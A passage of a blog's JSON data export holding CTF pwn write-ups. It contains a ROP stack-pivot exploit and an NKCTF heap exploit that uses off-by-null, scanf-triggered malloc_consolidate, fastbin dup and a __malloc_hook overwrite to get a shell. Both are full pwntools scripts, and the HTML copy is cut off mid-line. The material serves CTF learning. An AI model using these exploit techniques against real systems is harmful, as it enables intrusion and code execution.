py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class=\"number\">36843</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">acm</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;&gt; \\n&quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;what&#x27;s your comment?\\n&quot;</span>)</span><br><span class=\"line\">    s(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ctf</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;&gt; \\n&quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;what&#x27;s your corment?\\n&quot;</span>)</span><br><span class=\"line\">    s(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">love</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;&gt; \\n&quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;what&#x27;s your corMenT?\\n&quot;</span>)</span><br><span class=\"line\">    s(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">heart</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;&gt; \\n&quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;now, come and read my heart...\\n&quot;</span>)</span><br><span class=\"line\">    s(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">warning</span>():</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;&gt; \\n&quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;I give it up, you can see this. &quot;</span>)</span><br><span class=\"line\">    data=<span class=\"built_in\">int</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi_ret=<span class=\"number\">0x0000000000401573</span></span><br><span class=\"line\">bss_addr=<span class=\"number\">0x00000000004050A0</span></span><br><span class=\"line\">leave_ret=<span class=\"number\">0x000000000040139e</span></span><br><span class=\"line\"></span><br><span class=\"line\">puts_addr=warning()</span><br><span class=\"line\">libcbase=puts_addr-libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh_addr=libcbase+libc.search(<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>).__next__()</span><br><span class=\"line\"></span><br><span class=\"line\">ctf(p64(pop_rdi_ret))</span><br><span class=\"line\">acm(p64(binsh_addr))</span><br><span class=\"line\">love(p64(sys_addr))</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0xa</span>+p64(bss_addr-<span class=\"number\">0x8</span>)+p64(leave_ret)</span><br><span class=\"line\">heart(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"ByteDance","date":"2023-03-26T14:41:57.000Z","_content":"\nnkctf，利用off by null和**`scanf`在输入字符串较长时会调用`malloc`**的特性，最后get shell的过程类似`House of Orange`。\n\n<!-- more -->\n\nlibc版本：2.23-0ubuntu11.3\n\n会读一个随机数给堆指针加密，`read content`的时候有`off by null`，`chunk`最大0x40，最多0x20个chunk\n\n和hctf2018的heapstrom_zero好像，学习一波。\n\n使用`scanf`时，如 输入字符串比较长会调用`malloc`来分配内存，借此可以触发`malloc_consolidata`来合并`fast bin chunk`，这样`off by null`就有用了，把`size`改小来实现`overlapping`\n\n```py\nfrom pwn import *\ncontext(log_level='debug',os='linux',arch='amd64')\ncontext.terminal = ['gnome-terminal','-x','bash','-c']\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('/home/a1ph0nse/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')\np=process('./'+filename)\n# p = remote('node2.yuzhian.com.cn',32916)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\n\ndef add(size,content):\n    ru('Choice:')\n    sl('1')\n    ru('size:')\n    sl(str(size))\n    ru('content:')\n    sl(content)\n\ndef view(idx):\n    ru('Choice:')\n    sl('2')\n    ru('index:')\n    sl(str(idx))\n\ndef dele(idx):\n    ru('Choice:')\n    sl('3')\n    ru('index:')\n    sl(str(idx))\n\ndef triger_consolidate():\n    ru('Choice:')\n    sl('1'*0x400) # malloc_consolidate\n\nadd(0x38,'a')#0\n\nadd(0x28,'a')#1\nadd(0x28,'a')#2\nadd(0x18,'a')#3\nadd(0x18,'a')#4\nadd(0x38,'x')#5\nadd(0x28,'x')#6\nadd(0x38,'x')#7\nadd(0x38,'x')#8\nadd(0x38,'x')#9\npay = b'a'*0x20+p64(0x200)+p64(0x20)\nadd(0x38,pay)#10\n\nadd(0x38,'end')#11\n\nfor i in range(1,11):\n    dele(i)\n\ntriger_consolidate()\n\ndele(0)\npay = b'a'*0x38\nadd(0x38,pay)#0\n\nadd(0x38,'a'*8)#1\nadd(0x38,'b'*8)#2\nadd(0x38,'c'*8)#3\nadd(0x38,'x')#4\nadd(0x38,'x')#5\nadd(0x28,'x')#6\nadd(0x38,'x')#7\nadd(0x38,'x')#8\n\ndele(1)\ndele(2)\ndele(3)\n\ntriger_consolidate()\ndele(11)\ntriger_consolidate()\n\n\n\nadd(0x28,'a')#1\nadd(0x28,'a')#2\nadd(0x18,'a')#3\nadd(0x18,'a')#9\nadd(0x38,'1'*0x30)#10\nadd(0x38,'2'*0x30)#11\nadd(0x28,'3'*0x30)#12\nadd(0x38,'4'*0x30)#13\nadd(0x38,'5'*0x30)#14\npay = b'a'*0x20+p64(0x200)+p64(0x20)\nadd(0x38,pay)#15\n\nadd(0x38,'end')#16\n\ndele(1)\ndele(2)\ndele(3)\nfor i in range(9,16):\n    dele(i)\n\ntriger_consolidate()\n\ndele(0)\npay = b'a'*0x38\nadd(0x38,pay)#0\n\nadd(0x38,'a'*8)#1\nadd(0x38,'b'*8)#2\nadd(0x38,'c'*8)#3\n\nview(4)\nru('Content: ')\nlbase = u64(ru('\\n')[:-1].ljust(8,b'\\x00'))-0x3c4b20-88\nleak('lbase:',hex(lbase))\n\n\ndele(1)\ndele(2)\ndele(3)\ntriger_consolidate()\n\nadd(0x18,'A'*0x10)#1\nadd(0x28,'B'*0x20)#2\nadd(0x38,'C'*0x30)#3\nadd(0x18,'D'*0x10)#9\n\npay = p64(0)+p64(0x41)\nadd(0x18,pay)#6\nadd(0x28,'asd')\nadd(0x38,'zxc')#5,c\nadd(0x28,'qqq')#6,d\n\n\nadd(0x38,'a1')#14\nadd(0x28,'a2')#15\n\n#fastbin dup\ndele(5)\ndele(14)\ndele(0xc)\n\ndele(6)\ndele(15)\ndele(0xd)\n\n\nadd(0x28,p64(0x41))\nadd(0x28,'a')\nadd(0x28,'a')\n\nadd(0x38,p64(lbase+0x3c4b20+8))\nadd(0x38,'a')\nadd(0x38,'a')\nadd(0x38,p64(lbase+0x3c4b20+8+0x20)+b'\\x00'*0x10+p64(0x41))\nadd(0x38,b'\\x00'*0x20+p64(lbase+libc.sym['__malloc_hook']-0x18))\n\nadd(0x18,'a'*0x18)\nadd(0x18,p64(lbase+0xf03a4)*2)\n\nru('Choice:')\nsl('1')\nru('size:')\nsl(str(0x18))\n\nitr()\n```\n\n","source":"_posts/nkctf_ByteDance.md","raw":"---\ntitle: ByteDance\ndate: 2023-03-26 22:41:57\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n- House_of_xxx\n\n---\n\nnkctf，利用off by null和**`scanf`在输入字符串较长时会调用`malloc`**的特性，最后get shell的过程类似`House of Orange`。\n\n<!-- more -->\n\nlibc版本：2.23-0ubuntu11.3\n\n会读一个随机数给堆指针加密，`read content`的时候有`off by null`，`chunk`最大0x40，最多0x20个chunk\n\n和hctf2018的heapstrom_zero好像，学习一波。\n\n使用`scanf`时，如 输入字符串比较长会调用`malloc`来分配内存，借此可以触发`malloc_consolidata`来合并`fast bin chunk`，这样`off by null`就有用了，把`size`改小来实现`overlapping`\n\n```py\nfrom pwn import *\ncontext(log_level='debug',os='linux',arch='amd64')\ncontext.terminal = ['gnome-terminal','-x','bash','-c']\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('/home/a1ph0nse/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')\np=process('./'+filename)\n# p = remote('node2.yuzhian.com.cn',32916)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\n\ndef add(size,content):\n    ru('Choice:')\n    sl('1')\n    ru('size:')\n    sl(str(size))\n    ru('content:')\n    sl(content)\n\ndef view(idx):\n    ru('Choice:')\n    sl('2')\n    ru('index:')\n    sl(str(idx))\n\ndef dele(idx):\n    ru('Choice:')\n    sl('3')\n    ru('index:')\n    sl(str(idx))\n\ndef triger_consolidate():\n    ru('Choice:')\n    sl('1'*0x400) # malloc_consolidate\n\nadd(0x38,'a')#0\n\nadd(0x28,'a')#1\nadd(0x28,'a')#2\nadd(0x18,'a')#3\nadd(0x18,'a')#4\nadd(0x38,'x')#5\nadd(0x28,'x')#6\nadd(0x38,'x')#7\nadd(0x38,'x')#8\nadd(0x38,'x')#9\npay = b'a'*0x20+p64(0x200)+p64(0x20)\nadd(0x38,pay)#10\n\nadd(0x38,'end')#11\n\nfor i in range(1,11):\n    dele(i)\n\ntriger_consolidate()\n\ndele(0)\npay = b'a'*0x38\nadd(0x38,pay)#0\n\nadd(0x38,'a'*8)#1\nadd(0x38,'b'*8)#2\nadd(0x38,'c'*8)#3\nadd(0x38,'x')#4\nadd(0x38,'x')#5\nadd(0x28,'x')#6\nadd(0x38,'x')#7\nadd(0x38,'x')#8\n\ndele(1)\ndele(2)\ndele(3)\n\ntriger_consolidate()\ndele(11)\ntriger_consolidate()\n\n\n\nadd(0x28,'a')#1\nadd(0x28,'a')#2\nadd(0x18,'a')#3\nadd(0x18,'a')#9\nadd(0x38,'1'*0x30)#10\nadd(0x38,'2'*0x30)#11\nadd(0x28,'3'*0x30)#12\nadd(0x38,'4'*0x30)#13\nadd(0x38,'5'*0x30)#14\npay = b'a'*0x20+p64(0x200)+p64(0x20)\nadd(0x38,pay)#15\n\nadd(0x38,'end')#16\n\ndele(1)\ndele(2)\ndele(3)\nfor i in range(9,16):\n    dele(i)\n\ntriger_consolidate()\n\ndele(0)\npay = b'a'*0x38\nadd(0x38,pay)#0\n\nadd(0x38,'a'*8)#1\nadd(0x38,'b'*8)#2\nadd(0x38,'c'*8)#3\n\nview(4)\nru('Content: ')\nlbase = u64(ru('\\n')[:-1].ljust(8,b'\\x00'))-0x3c4b20-88\nleak('lbase:',hex(lbase))\n\n\ndele(1)\ndele(2)\ndele(3)\ntriger_consolidate()\n\nadd(0x18,'A'*0x10)#1\nadd(0x28,'B'*0x20)#2\nadd(0x38,'C'*0x30)#3\nadd(0x18,'D'*0x10)#9\n\npay = p64(0)+p64(0x41)\nadd(0x18,pay)#6\nadd(0x28,'asd')\nadd(0x38,'zxc')#5,c\nadd(0x28,'qqq')#6,d\n\n\nadd(0x38,'a1')#14\nadd(0x28,'a2')#15\n\n#fastbin dup\ndele(5)\ndele(14)\ndele(0xc)\n\ndele(6)\ndele(15)\ndele(0xd)\n\n\nadd(0x28,p64(0x41))\nadd(0x28,'a')\nadd(0x28,'a')\n\nadd(0x38,p64(lbase+0x3c4b20+8))\nadd(0x38,'a')\nadd(0x38,'a')\nadd(0x38,p64(lbase+0x3c4b20+8+0x20)+b'\\x00'*0x10+p64(0x41))\nadd(0x38,b'\\x00'*0x20+p64(lbase+libc.sym['__malloc_hook']-0x18))\n\nadd(0x18,'a'*0x18)\nadd(0x18,p64(lbase+0xf03a4)*2)\n\nru('Choice:')\nsl('1')\nru('size:')\nsl(str(0x18))\n\nitr()\n```\n\n","slug":"nkctf_ByteDance","published":1,"updated":"2023-03-30T13:35:44.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czag7004k5oud0vvr222r","content":"<p>nkctf，利用off by null和**<code>scanf</code>在输入字符串较长时会调用<code>malloc</code>**的特性，最后get shell的过程类似<code>House of Orange</code>。</p>\n<span id=\"more\"></span>\n\n<p>libc版本：2.23-0ubuntu11.3</p>\n<p>会读一个随机数给堆指针加密，<code>read content</code>的时候有<code>off by null</code>，<code>chunk</code>最大0x40，最多0x20个chunk</p>\n<p>和hctf2018的heapstrom_zero好像，学习一波。</p>\n<p>使用<code>scanf</code>时，如 输入字符串比较长会调用<code>malloc</code>来分配内存，借此可以触发<code>malloc_consolidata</code>来合并<code>fast bin chunk</code>，这样<code>off by null</code>就有用了，把<code>size</code>改小来实现<code>overlapping</code></p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;gnome-terminal&#x27;</span>,<span class=\"string\">&#x27;-x&#x27;</span>,<span class=\"string\">&#x27;bash&#x27;</span>,<span class=\"string\">&#x27;-c&#x27;</span>]</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;/home/a1ph0nse/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># p = remote(&#x27;node2.yuzhian.com.cn&#x27;,32916)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;Choice:&#x27;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;size:&#x27;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;content:&#x27;</span>)</span><br><span class=\"line\">    sl(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">view</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;Choice:&#x27;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;index:&#x27;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;Choice:&#x27;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;index:&#x27;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">triger_consolidate</span>():</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;Choice:&#x27;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&#x27;1&#x27;</span>*<span class=\"number\">0x400</span>) <span class=\"comment\"># malloc_consolidate</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#6</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#7</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#8</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#9</span></span><br><span class=\"line\">pay = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0x200</span>)+p64(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,pay)<span class=\"comment\">#10</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;end&#x27;</span>)<span class=\"comment\">#11</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">11</span>):</span><br><span class=\"line\">    dele(i)</span><br><span 